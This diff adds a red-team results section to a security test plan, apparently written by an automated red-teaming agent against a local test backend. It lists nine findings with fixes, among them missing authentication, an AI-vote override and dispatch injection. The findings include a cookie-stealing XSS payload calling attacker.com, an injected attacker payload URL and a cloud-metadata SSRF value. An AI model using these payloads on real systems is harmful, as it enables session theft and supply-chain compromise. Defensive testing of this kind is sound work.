@@ -491,3 +491,167 @@ This is the highest-impact composite exploit for the red-teamer to attempt:
 4. **State machine is enforced** — you cannot directly PUT an arbitrary status. Use the workflow endpoints.
 5. **Cascade dispatch** (PEN-007) requires the dependent to already be in `approved` status before the blocker is rejected.
 6. **The `/api/work-items/:id/transition` endpoint in `security.config.yml` does not exist** — the actual transition endpoints are `/route`, `/assess`, `/approve`, `/reject`, `/dispatch`.
+
+---
+
+## Red Team Results
+
+**Executed by:** red-teamer agent  
+**Date:** 2026-06-01  
+**Environment:** Ephemeral — `docker-compose.test.yml` → `portal/Backend/` (port 3001)  
+**Chains Attempted:** 9  
+**Objectives Achieved:** 4 / 4  
+**Confirmed Breaches:** 7
+
+> **SCOPE DISCREPANCY (Critical Process Finding):**  
+> The pen-tester analyzed `Source/Backend/` (work-items state machine) but the test environment (`docker-compose.test.yml`) runs `portal/Backend/` (feature requests, bugs, cycles, pipeline-runs). All 13 pen-tester PEN-IDs reference routes that return **HTTP 404** in the live environment. The red-teamer pivoted to the live target and discovered equivalent (and in some cases more severe) vulnerabilities in the portal application. This discrepancy must be resolved — either the pen-tester must analyze `portal/Backend/`, or the docker-compose must be updated to run `Source/Backend/`.
+
+---
+
+### RED-001: No Authentication on Any Portal Endpoint
+- **Severity:** Critical
+- **Objective Achieved:** Yes
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/feature-requests`, `/api/bugs`, `/api/cycles`, `/api/team-dispatches`, `/api/learnings`, `/api/pipeline-runs`, `/api/search`
+- **Based On:** PEN-001 (equivalent in portal application)
+- **Exploit Scenario:**
+  1. Issue `GET http://localhost:3001/api/feature-requests` with no Authorization header, cookie, or token.
+  2. Server responds HTTP 200 with full data payload: `{"data":[...]}`.
+  3. Confirmed across ALL 8 API route families — zero 401/403 responses.
+  4. Evidence: `POST /api/feature-requests` → HTTP 201 Created with no credentials.
+- **Recommendation:** Implement an authentication middleware (JWT or session-based) mounted at the Express app level before all route handlers. Gate every non-health endpoint.
+
+---
+
+### RED-002: Unauthenticated Force-Approve Bypasses AI Voting System
+- **Severity:** Critical
+- **Objective Achieved:** Yes (Bypass work item state machine / approval gate)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests/FR-0002/force-approve`
+- **Based On:** PEN-002, PEN-004, PEN-005 (equivalent in portal)
+- **Exploit Scenario:**
+  1. Create feature request FR-0002 via `POST /api/feature-requests` (no auth).
+  2. Trigger AI voting via `POST /api/feature-requests/FR-0002/vote` — produces 4 **DENY** / 1 approve from AI agents.
+  3. Regular `/approve` endpoint correctly rejects: `{"error":"Cannot approve: majority vote is not 'approve'. Approve: 1, Deny: 4"}`.
+  4. Call `POST /api/feature-requests/FR-0002/force-approve` with no credentials — request succeeds.
+  5. Response: `status: "approved"`, `human_approval_approved_at: "2026-06-01T08:52:37.799Z"` — 4 AI deny votes overridden.
+  6. Any item, regardless of vote outcome, can be force-approved by any unauthenticated caller.
+- **Recommendation:** Add authentication guard to `/force-approve`. This endpoint must require a privileged role (e.g., `product-owner` or `admin`). Regular `/approve` already enforces majority — `force-approve` must at minimum require authentication.
+
+---
+
+### RED-003: Unauthenticated Team Dispatch Injection with Attacker-Controlled Payload
+- **Severity:** Critical
+- **Objective Achieved:** Yes (Submit malformed assessment that bypasses routing)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/team-dispatches`
+- **Based On:** PEN-003 (equivalent), new finding — no analog in pen-tester map
+- **Exploit Scenario:**
+  1. `POST /api/team-dispatches` with body:
+     ```json
+     {
+       "team": "TheATeam",
+       "inputs": {"feature_request_id": "FR-0001", "injected_by": "red-team"},
+       "actions_url": "http://attacker.com/red-team-payload",
+       "workflow": "malicious-deploy.yml",
+       "repo": "attacker/payload"
+     }
+     ```
+  2. Server responds HTTP 201 with stored record: `{"id":"46857169-703f-478d-9e6f-bc5224de087a",...}`.
+  3. Dispatch record is now visible in GET /api/team-dispatches with attacker-controlled `actions_url`, `workflow`, and `repo`.
+  4. If `actions_url` is ever automatically triggered by the orchestrator, this is an SSRF / supply-chain injection vector.
+  5. Confirmed: SSRF payload `actions_url: "http://169.254.169.254/latest/meta-data/"` stored successfully (no server-side fetch, stored only).
+- **Recommendation:** Require authentication and authorization for dispatch creation. Validate `actions_url` against an allowlist of known GitHub Actions URLs. The `repo` and `workflow` fields must be validated against allowed repositories.
+
+---
+
+### RED-004: Unbounded Data Enumeration — No Pagination on Feature-Requests List
+- **Severity:** Medium
+- **Objective Achieved:** Yes (Enumerate all items without pagination limit)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/api/feature-requests`
+- **Based On:** PEN-006 (equivalent)
+- **Exploit Scenario:**
+  1. `GET /api/feature-requests` — no `limit` parameter accepted; query param `?limit=1` is silently ignored.
+  2. All feature requests returned unconditionally regardless of any limit query param.
+  3. Verified: 12 items seeded, all 12 returned even with `?limit=1`.
+  4. Service layer calls `listFeatureRequests(db, {status, source})` with no pagination — returns entire table.
+  5. `GET /api/bugs` behaves identically — no pagination limit enforced.
+- **Recommendation:** Add a `limit`/`offset` parameter to all list endpoints with a server-enforced maximum (e.g., `Math.min(parseInt(limit)||20, 100)`). The `listFeatureRequests` service function must accept pagination parameters and pass them to the SQL query.
+
+---
+
+### RED-005: Unauthenticated Resource Modification (IDOR / No Ownership Check)
+- **Severity:** High
+- **Objective Achieved:** Yes (partial — modify any resource without ownership)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `PATCH http://localhost:3001/api/feature-requests/:id`, `DELETE /api/feature-requests/:id`
+- **Based On:** PEN-002 (equivalent)
+- **Exploit Scenario:**
+  1. Resource FR-0014 created (simulating User A).
+  2. `PATCH /api/feature-requests/FR-0014` with `{"description":"OWNED by red team"}` — HTTP 200, description modified.
+  3. `DELETE /api/feature-requests/FR-0014` — HTTP 204, record permanently deleted.
+  4. No ownership verification, no authentication, no RBAC — any caller can modify or delete any resource.
+- **Recommendation:** Implement authentication and resource ownership checks. Only the creator (or an admin role) should be able to PATCH or DELETE a resource. Implement soft-delete with an audit trail rather than hard deletes.
+
+---
+
+### RED-006: Stored XSS via Unescaped User-Controlled Fields
+- **Severity:** High
+- **Objective Achieved:** Partial
+- **Status:** Confirmed (Live Exploit — Stored Payload)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests` → `GET /api/feature-requests/:id`
+- **Based On:** New finding — not in pen-tester map
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` with `{"title":"<script>alert(document.cookie)</script>XSS Test","description":"<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>"}`.
+  2. Server responds HTTP 201, stores payload verbatim: `title: "<script>alert(document.cookie)</script>XSS Test"`.
+  3. `GET /api/feature-requests/FR-0013` returns the raw payload; `Content-Type: application/json` (not HTML).
+  4. If rendered in a frontend template without proper escaping, this executes in the victim's browser and exfiltrates cookies.
+  5. The portal frontend (React) may or may not escape properly — server-side storage of raw HTML is confirmed.
+- **Recommendation:** Sanitize user-controlled string fields server-side using a library like `dompurify` or `sanitize-html`. Strip HTML tags from `title`, `description`, and other text fields on ingest.
+
+---
+
+### RED-007: Prometheus Metrics Expose Full Route Map and Operational Intelligence
+- **Severity:** Low
+- **Objective Achieved:** Partial (reconnaissance enabler for RED-001 through RED-006)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/metrics`
+- **Based On:** PEN-011 (equivalent)
+- **Exploit Scenario:**
+  1. `GET http://localhost:3001/metrics` — HTTP 200, no authentication.
+  2. Metrics reveal all route paths including undiscovered endpoints: `/:id/force-approve`, `/:id/vote`, etc.
+  3. HTTP request counts, latencies by route, and status code distributions expose which endpoints are actively used.
+  4. This reconnaissance was used to discover the undocumented `/force-approve` endpoint (RED-002).
+- **Recommendation:** Gate `/metrics` behind network-level ACL or token-based access (e.g., `Authorization: Bearer <scrape-token>`). Do not expose internal route maps to unauthenticated callers.
+
+---
+
+### RED-008: Pipeline Runs Expose Internal Agent Identities and Stage Architecture
+- **Severity:** Medium
+- **Objective Achieved:** Partial
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/api/pipeline-runs`
+- **Based On:** New finding — not in pen-tester map
+- **Exploit Scenario:**
+  1. `GET /api/pipeline-runs` — HTTP 200, no authentication.
+  2. Response exposes full CI/CD pipeline structure: stage names, agent IDs, verdicts, and timing.
+  3. Confirmed agent identities exposed: `requirements-reviewer`, `api-contract`, `backend-coder`, `frontend-coder`, `chaos-tester`, `security-qa`, `traceability-reporter`, `visual-playwright`, `qa-review-and-tests`, `design-critic`, `integration-reviewer`.
+  4. This organizational intelligence enables targeted social engineering and knowledge of internal QA/security gaps.
+- **Recommendation:** Require authentication to access pipeline run data. This endpoint reveals internal agent architecture and should be restricted to authenticated operators.
+
+---
+
+### RED-009: Full Business Logic Takeover — 4-Step Unauthenticated Compromise Chain
+- **Severity:** Critical
+- **Objective Achieved:** Yes (all four security objectives achieved)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** Multiple endpoints
+- **Based On:** RED-001 + RED-002 + RED-003 (composite)
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` — create attacker-controlled feature request FR-0014. No auth. HTTP 201.
+  2. `POST /api/feature-requests/FR-0014/vote` — trigger AI voting (outcome doesn't matter). No auth. HTTP 200.
+  3. `POST /api/feature-requests/FR-0014/force-approve` — override all AI votes, set status to `approved`. No auth. HTTP 200.
+  4. `POST /api/team-dispatches` — inject dispatch record with `actions_url: "http://attacker.com/red-team-payload"`, `workflow: "malicious-deploy.yml"`, `repo: "attacker/payload"`. No auth. HTTP 201.
+  5. **Net effect:** Attacker created a feature, bypassed all AI quality gates, and injected a team dispatch pointing to attacker infrastructure — entirely without credentials in 4 HTTP calls.
+- **Recommendation:** This chain is only possible because of zero authentication across all endpoints. The fix is architectural: implement authentication middleware at the Express app level, add RBAC for privileged actions (`force-approve`, dispatch creation), and validate `actions_url` against an allowlist.
